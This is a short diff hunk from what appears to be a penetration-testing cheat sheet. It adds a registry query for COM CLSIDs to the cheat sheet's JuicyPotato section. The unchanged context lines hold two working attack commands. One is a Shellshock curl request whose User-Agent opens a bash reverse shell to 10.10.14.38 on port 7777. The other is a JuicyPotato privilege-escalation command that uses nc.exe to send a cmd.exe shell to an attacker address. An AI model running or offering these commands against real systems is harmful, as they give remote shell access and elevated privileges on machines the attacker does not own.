@@ -4519,6 +4519,7 @@ $ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1
 
 ```
 https://github.com/ohpe/juicy-potato
+C:\> reg query HKCR\CLSID /s /f LocalService
 C:\> JuicyPotato.exe -l <port> -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <IP address> <port> -e cmd.exe" -t *
 ```
 
